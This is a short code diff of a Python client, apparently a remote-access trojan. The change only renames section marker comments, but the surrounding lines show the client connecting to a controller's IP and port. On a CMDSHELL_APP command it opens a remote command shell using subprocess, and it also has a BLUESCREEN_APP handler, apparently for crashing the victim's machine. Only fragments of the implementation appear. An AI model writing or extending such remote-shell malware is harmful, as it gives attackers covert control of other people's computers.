@@ -57,7 +57,7 @@ def PINGPONG_client_T(ip, port):
                 break
             elif data.decode() == "CHECK_APP":
                 s.send(bytes("OK", "utf8"))
-#cmd_START_location
+#cmdshell_START_location
             elif data.decode() == "CMDSHELL_APP":
                 def CMD_client(ip, port, s, is_connect=False, cmd_c=None):
                     from subprocess import Popen, PIPE
@@ -99,7 +99,7 @@ def PINGPONG_client_T(ip, port):
                 cmd_port = int(s.recv(1024).decode(encoding="utf8"))
                 s.send(b'OK')
                 CMD_client(ip, cmd_port, s)
-#cmd_END_location
+#cmdshell_END_location
 #bluescreen_START_location
             elif data.decode() == 'BLUESCREEN_APP':
                 s.send(bytes("OK", 'utf8'))
